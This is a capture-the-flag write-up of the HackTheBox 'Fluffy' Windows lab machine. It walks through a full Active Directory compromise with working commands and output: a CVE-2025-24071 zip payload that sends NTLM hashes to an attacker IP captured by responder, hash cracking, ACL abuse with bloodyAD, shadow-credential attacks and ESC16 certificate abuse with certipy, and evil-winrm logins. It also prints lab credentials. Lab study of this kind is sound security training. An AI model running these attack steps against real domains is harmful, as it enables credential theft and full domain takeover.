---
layout: post
title: "HTB Fluffy Writeup"
date: 2025-09-21 11:45:45 -0400
categories: hackthebox HTB-easy
tags: hacking CTF HTB HTB-easy windows bloodhound active-directory shadow-credentials AD-CS
---
## Introduction
This is an easy Windows machine on [HackTheBox](https://app.hackthebox.com/machines/Fluffy){:target="_blank"}{:rel="noopener noreferrer"}. We're given credentials at the beginning 

```
j.fleischman:J0elTHEM4n1990!
```

![htb-fluffy-pwn](images/HTB-fluffy/htb-fluffy-pwn.png)
## Enumeration
### Port Scan
Let's find out what services are accessible 

```bash
rustscan -a <MACHINE_IP> -- -A -sCV
```

There are quite a few ports open
```bash
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-12 10:01:39Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49745/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

Looks like an active directory machine! Add the domain to our `/etc/hosts` file
```
<MACHINE_IP> fluffy.htb
```

### SMB (139, 445)
Let's connect to `SMB` with the provided credentials

```bash
smbclient.py 'j.fleischman:J0elTHEM4n1990!@fluffy.htb'
```

```bash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Mon May 19 10:27:02 2025 .
drw-rw-rw-          0  Mon May 19 10:27:02 2025 ..
drw-rw-rw-          0  Fri May 16 10:51:49 2025 Everything-1.4.1.1026.x64
-rw-rw-rw-    1827464  Fri May 16 10:51:49 2025 Everything-1.4.1.1026.x64.zip
drw-rw-rw-          0  Fri May 16 10:51:49 2025 KeePass-2.58
-rw-rw-rw-    3225346  Fri May 16 10:51:49 2025 KeePass-2.58.zip
-rw-rw-rw-     169963  Sat May 17 10:31:07 2025 Upgrade_Notice.pdf
```

Download and read the pdf file
```bash
get Upgrade_Notice.pdf
```
## user.txt
### j.fleischman -> p.agila
The pdf file contains a list of CVEs the server is vulnerable to

```bash
# spoofing over network
CVE-2025-24996
CVE-2025-24071

# denial of service
CVE-2025-46785
CVE-2025-29968

# AD spoofing
CVE-2025-21193

# create/overwrite files!!!
CVE-2025-3445
```

We're able to find an exploit for [CVE-2025-24071](https://github.com/0x6rss/CVE-2025-24071_PoC){:target="_blank"}{:rel="noopener noreferrer"}. It'll create a malicious archive file we need to upload onto the server. When it's extracted, the payload will send user's `NTLM` hash to the attacking machine!

Clone the repo and use the script to generate our payload, substituting your IP. This will create the file `exploit.zip` which we want to upload. 
```bash
python3 poc.py
Enter your file name: test
Enter IP (EX: 192.168.1.162): <ATTACKER_IP>
completed
```

We need to setup our machine to accept the requests from the victim machine using `responder`
```bash
sudo responder -I tun0
```

Upload the `exploit.zip` file to `SMB` and wait for a response in responder
```bash
┌──(kali㉿kali)-[~/fluffy/CVE-2025-24071_PoC]
└─$ smbclient.py 'j.fleischman:J0elTHEM4n1990!@fluffy.htb'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# use IT
# put exploit.zip
```

```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:<HASH_REDACTED>
```

![htb-fluffy-hash](images/HTB-fluffy/htb-fluffy-hash.png)

After copying the entire section from `p.agila -> ...000` into the file `crack.txt`, we can use `john` to crack the hash
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --fork=3 --progress-every=30 crack.txt
```

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Node numbers 1-3 of 3 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD_REDACTED>  (p.agila) 
```

With these new credentials, we're able to view the active directory relationships with [bloodhound-python](https://github.com/dirkjanm/BloodHound.py)

```bash
bloodhound-python -u 'p.agila' -p '<PASSWORD_REDACTED>' -d fluffy.htb -ns 10.10.11.69 -c all --zip 
```

Now we need to setup `bloodhound` to view the relationships
```bash
# set the username and password for bloodhound
# if you haven't already
neo4j console
```

Now we can run the web interface and upload our `zip` file in the `Upload Data` tab
```bash
bloodhound
```

Let's visualize the `Shortest Path to Domain Admins` from the `Analysis` tab

![htb-fluffy-bloodhound](images/HTB-fluffy/htb-fluffy-bloodhound.png)

`p.agila` is part of the `Service Account Managers` group and has the `Generic All` permission over the `Service Accounts` group. This group has the `Generic Write` permission over the `winrm_svc` account which can create a remote powershell session on the server, giving us a foothold! 

First we'll add `p.agila` to the `Service Accounts` group
```bash
bloodyAD --host 10.10.11.69 -d fluffy.htb -u 'p.agila' -p '<PASSWORD_REDACTED>' add groupMember 'Service Accounts' 'p.agila' 
```

```bash
[+] p.agila added to Service Accounts
```
> If the future commands don't work, you may need to add `p.agila` back to the `Service Accounts` group as the box tries to reset itself for future hackers 
{: .prompt-tip}

The `Generic Write` permission doesn't let us overwrite a password but we can use a [shadow credential attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab){:target="_blank"}{:rel="noopener noreferrer"}. By modifying/writing to the **msDS-KeyCredentialLink** property of the `winrm_svc` user, we can **obtain a TGT and NT hash** for that user!
### p.agila -> winrm_svc
We can use [certipy](https://github.com/ly4k/Certipy){:target="_blank"}{:rel="noopener noreferrer"} to do the heavy lifting and generate a way to authenticate as `winrm_svc`
```bash
certipy shadow auto -u 'p.agila@fluffy.htb' -p '<PASSWORD_REDACTED>' -account 'winrm_svc'
```

If this error pops up
```bash
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

We need to sync the time on our machine with the server's time. I added this to my `.zshrc` and prepended time sensitive commands with the alias `sync-ad`
```bash
alias sync-ad="faketime \"\$(ntpdate -q fluffy.htb | cut -d ' ' -f 1,2)\" ""
```

Run the `certipy` command again and we should obtain a hash
```bash
sync-ad certipy shadow auto -u 'p.agila@fluffy.htb' -p '<PASSWORD_REDACTED>' -account 'winrm_svc'
```

```bash
Certipy v4.8.2 - by Oliver Lyak (ly4k)

Wed Aug 13 20:03:39 EDT 2025
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '6e1663ed-5248-1100-6f1e-8baaee8c9135'
[*] Adding Key Credential with device ID '6e1663ed-5248-1100-6f1e-8baaee8c9135' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '6e1663ed-5248-1100-6f1e-8baaee8c9135' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': <HASH_REDACTED>
```

Use this to login with `evil-winrm` and obtain the user flag
```bash
sync-ad evil-winrm -u 'winrm_svc' -H '<HASH_REDACTED>' -i fluffy.htb
```

![htb-fluffy-user-txt](images/HTB-fluffy/htb-fluffy-user-txt.png)

## root.txt
### p.agila -> ca_svc
To enumerate vulnerable certificates, we'll need to get access to the `Certificate Authority` user (`ca_svc`) who is part of the `Service Accounts` group. 

Since the `p.agila` user has the `Generic All` permission over the `Service Accounts` group, we can run another shadow credential attack and grab their hash
```bash
sync-ad certipy shadow auto -u 'p.agila@fluffy.htb' -p '<PASSWORD_REDACTED>' -account 'ca_svc'
```

```bash
Wed Aug 13 20:47:18 EDT 2025
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fe1da73f-001c-b67f-4fcb-6ca2364d513a'
[*] Adding Key Credential with device ID 'fe1da73f-001c-b67f-4fcb-6ca2364d513a' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'fe1da73f-001c-b67f-4fcb-6ca2364d513a' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': <HASH_REDACTED>
```

Now let's use `certipy` to find related `ca` vulnerabilities with this account
```bash
sync-ad certipy-ad find -u 'ca_svc@fluffy.htb' -hashes '<HASH_REDACTED>' -dc-ip 10.10.11.69 -vulnerable -stdout
```

```bash
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```
> Make sure you're using the latest version of certipy to find it!
{: .prompt-tip}

### ca_svc -> administrator

Looks like we may be able to use the [ESC16 Privesc](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally){:target="_blank"}{:rel="noopener noreferrer"}! We just need to follow the steps in the documentation

First let's read the initial `UPN` of the victim account
```bash
sync-ad certipy-ad account -u 'ca_svc@fluffy.htb' -hashes '<HASH_REDACTED>' -dc-ip 10.10.11.69 -user 'ca_svc' read
```

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-08-14T01:09:48+00:00
```

Next we change the `UPN` to the account we want to impersonate. In this case it'll be `administrator@fluffy.htb`
```bash
certipy-ad account -u 'ca_svc@fluffy.htb' -hashes '<HASH_REDACTED>' -dc-ip 10.10.11.69 -user 'ca_svc' -upn 'administrator' update
```

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Now we can request a certificate for the `administrator` user!
```bash
export KRB5CCNAME=ca_svc.ccache
```

```bash
sync-ad certipy-ad req -k -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'FLUFFY-DC01-CA' -template 'User'
```

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

We have the `administrator` certificate so let's cover our tracks and revert the `ca_svc` `UPN` back to the original
```bash
certipy-ad account -u 'ca_svc@fluffy.htb' -hashes '<HASH_REDACTED>' -dc-ip 10.10.11.69 -user 'ca_svc' -upn 'ca_svc' update
```

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc
[*] Successfully updated 'ca_svc'
```

Using our `administrator.pfx` certificate we can obtain the `administrator`'s hash
```bash
sync-ad certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

```bash
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': <HASH_REDACTED>
```

Now we can login as the `administrator` user and obtain the `root` flag
```bash
sync-ad evil-winrm -u 'administrator' -H '<HASH_REDACTED>' -i 10.10.11.69
```

![htb-fluffy-root-txt](images/HTB-fluffy/htb-fluffy-root-txt.png)

## Recap
Using the credentials given at the start, we can download a `pdf` file in the `IT` `SMB` share which lists CVEs affecting the server. Using [CVE-2025-24071](https://github.com/0x6rss/CVE-2025-24071_PoC){:target="_blank"}{:rel="noopener noreferrer"} we can obtain credentials for the `p.agila` user. 

Using a [shadow credential attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab){:target="_blank"}{:rel="noopener noreferrer"} we can login as the `winrm` user and obtain the user flag. 

Repeating a [shadow credential attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab){:target="_blank"}{:rel="noopener noreferrer"} for the `Certificate Authority` user, we can abuse the [ESC16 Privesc](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally){:target="_blank"}{:rel="noopener noreferrer"} with [certipy](https://github.com/ly4k/Certipy){:target="_blank"}{:rel="noopener noreferrer"} to obtain the `administrator` user's hash and grab the `root` flag.

